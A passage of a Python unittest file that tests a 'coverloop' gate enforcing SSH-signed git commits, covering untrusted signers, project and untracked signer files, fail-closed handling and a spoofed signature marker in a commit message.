                          capture_output=True).returncode != 0:
            self.skipTest("ssh-keygen failed")
        # allowed_signers is EMPTY -> the signature is good but the signer is
        # untrusted (unknown validity)
        allowed = os.path.join(self.tmp.name, "allowed_signers")
        open(allowed, "w").close()
        for cfg in (["gpg.format", "ssh"], ["user.signingkey", key],
                    ["gpg.ssh.allowedSignersFile", allowed]):
            sh(["git", "config"] + cfg, self.repo)
        self.init_project()
        self.write("feature.py", "print('untrusted')\n")
        sh(["git", "add", "-A"], self.repo)
        if subprocess.run(["git", "commit", "-S", "-qm", "untrusted-signed"],
                          cwd=self.repo, capture_output=True).returncode != 0:
            self.skipTest("git ssh-signing unsupported here")
        gq = subprocess.run(["git", "log", "-1", "--format=%G?", "HEAD"], cwd=self.repo,
                            capture_output=True, text=True).stdout.strip()
        if gq != "U":  # environment didn't produce the untrusted state we need
            self.skipTest("expected %G?=U for untrusted signer, got %r" % gq)
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        r = run(["gate", "--min-tier", "L1", "--require-signed-commit"], self.repo)
        self.assertEqual(r.returncode, 1, "untrusted-key signature must FAIL: " + r.stdout + r.stderr)
        self.assertNotIn("Traceback", r.stderr)

    def test_require_signed_commit_uses_project_signers(self):
        """R4 (Sol gap #2): a repo-committed .coverloop/allowed_signers defines
        WHO may sign, independent of the machine's ambient git trust. With the
        machine allowed_signers EMPTY (ambient would be 'U'), a signer listed in
        the PROJECT file must still pass — the gate auto-detects that file."""
        import shutil
        if not shutil.which("ssh-keygen"):
            self.skipTest("ssh-keygen unavailable")
        key = os.path.join(self.tmp.name, "id_ed25519")
        if subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key, "-q"],
                          capture_output=True).returncode != 0:
            self.skipTest("ssh-keygen failed")
        pub = open(key + ".pub").read().strip()
        machine_allowed = os.path.join(self.tmp.name, "machine_allowed")  # EMPTY -> ambient 'U'
        open(machine_allowed, "w").close()
        for cfg in (["gpg.format", "ssh"], ["user.signingkey", key],
                    ["gpg.ssh.allowedSignersFile", machine_allowed]):
            sh(["git", "config"] + cfg, self.repo)
        self.init_project()
        proj_signers = os.path.join(self.repo, ".coverloop", "allowed_signers")
        with open(proj_signers, "w") as fh:
            fh.write("t@example.com %s\n" % pub)
        self.write("feature.py", "print('proj-signed')\n")
        sh(["git", "add", "-A"], self.repo)
        if subprocess.run(["git", "commit", "-S", "-qm", "proj signed"],
                          cwd=self.repo, capture_output=True).returncode != 0:
            self.skipTest("git ssh-signing unsupported here")
        amb = subprocess.run(["git", "log", "-1", "--format=%G?", "HEAD"], cwd=self.repo,
                             capture_output=True, text=True).stdout.strip()
        proj = subprocess.run(["git", "-c", "gpg.ssh.allowedSignersFile=" + proj_signers,
                               "log", "-1", "--format=%G?", "HEAD"], cwd=self.repo,
                              capture_output=True, text=True).stdout.strip()
        if not (amb == "U" and proj == "G"):
            self.skipTest("env didn't produce ambient=U / project=G (got %r / %r)" % (amb, proj))
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        r = run(["gate", "--min-tier", "L1", "--require-signed-commit"], self.repo)
        self.assertEqual(r.returncode, 0, "project-signer gate should PASS: " + r.stdout + r.stderr)
        self.assertIn("project signer policy", (r.stdout + r.stderr).lower())

    def test_dirty_untracked_signers_file_does_not_self_authorize(self):
        """Sol/M3/GLM R4 P1: an UNTRACKED working-tree .coverloop/allowed_signers
        must be ignored — the policy is read from the committed blob at the gated
        sha. Machine trust empty + signer only in a dirty file => gate FAILS."""
        import shutil
        if not shutil.which("ssh-keygen"):
            self.skipTest("ssh-keygen unavailable")
        key = os.path.join(self.tmp.name, "id_ed25519")
        if subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", key, "-q"],
                          capture_output=True).returncode != 0:
            self.skipTest("ssh-keygen failed")
        pub = open(key + ".pub").read().strip()
        machine_allowed = os.path.join(self.tmp.name, "machine_allowed")
        open(machine_allowed, "w").close()  # ambient trust = 'U'
        for cfg in (["gpg.format", "ssh"], ["user.signingkey", key],
                    ["gpg.ssh.allowedSignersFile", machine_allowed]):
            sh(["git", "config"] + cfg, self.repo)
        self.init_project()
        self.write("feature.py", "print('x')\n")
        sh(["git", "add", "-A"], self.repo)  # NOTE: no signers file committed
        if subprocess.run(["git", "commit", "-S", "-qm", "signed, no policy"],
                          cwd=self.repo, capture_output=True).returncode != 0:
            self.skipTest("git ssh-signing unsupported here")
        # drop the policy file ONLY in the working tree (untracked, not committed)
        with open(os.path.join(self.repo, ".coverloop", "allowed_signers"), "w") as fh:
            fh.write("t@example.com %s\n" % pub)
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        r = run(["gate", "--min-tier", "L1", "--require-signed-commit"], self.repo)
        self.assertEqual(r.returncode, 1, "dirty signers file must NOT self-authorize: "
                         + r.stdout + r.stderr)
        self.assertNotIn("Traceback", r.stderr)

    def test_require_signed_commit_with_explicit_signers_is_fail_closed(self):
        """--signers with an unsigned/non-SSH HEAD must FAIL closed (a project
        policy governs ssh signatures; an unsigned commit can't satisfy it). No
        ssh setup needed."""
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)  # HEAD is unsigned
        sf = os.path.join(self.tmp.name, "signers")
        open(sf, "w").close()
        r = run(["gate", "--min-tier", "L1", "--require-signed-commit", "--signers", sf], self.repo)
        self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
        self.assertNotIn("Traceback", r.stderr)

    def test_empty_signers_arg_is_rejected(self):
        """GLM R4 P2-5: --signers "" must error, not silently fall through to
        auto-detect / ambient trust."""
        self.init_project()
        run(["attest", "--tier", "L1", "--tests"], self.repo)
        r = run(["gate", "--min-tier", "L1", "--require-signed-commit", "--signers", ""], self.repo)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("empty", (r.stdout + r.stderr).lower())

    def test_is_ssh_signed_ignores_message_marker(self):
        """Sol R4 (spoof): _is_ssh_signed must parse ONLY the gpgsig header, so a
        commit MESSAGE containing '-----BEGIN SSH SIGNATURE-----' on an unsigned
        (or GPG-signed) commit is NOT mistaken for an ssh signature — otherwise a
        GPG commit could bypass the ssh-only project policy."""
        import importlib.util
        import importlib.machinery
        loader = importlib.machinery.SourceFileLoader("coverloop_mod", CLI)
        spec = importlib.util.spec_from_loader("coverloop_mod", loader)
        mod = importlib.util.module_from_spec(spec)
        loader.exec_module(mod)
        self.commit("f.py", "print(1)", msg="feat\n\n-----BEGIN SSH SIGNATURE-----\nspoof")
        sha = self.git_out(["rev-parse", "HEAD"])
        self.assertFalse(mod._is_ssh_signed(self.repo, sha),
                         "a message-body marker spoofed ssh-signature detection")


if __name__ == "__main__":
    unittest.main()
